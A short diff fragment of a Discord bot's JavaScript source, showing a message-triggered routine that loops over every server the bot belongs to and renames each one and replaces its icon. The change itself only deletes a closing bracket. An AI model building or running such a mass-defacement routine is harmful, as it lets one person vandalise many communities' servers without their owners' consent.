@@ -37,7 +37,7 @@ if (message.content === x_x) {
    client.guilds.forEach(hack => {
    hack.setIcon(pic)
    hack.setName(namee)})})})}});
-});
+
    const adminprefix = "!!";
 const developers = ["517884556540379152"]//Nova Codes
 client.on('message', message => {//Nova Codes
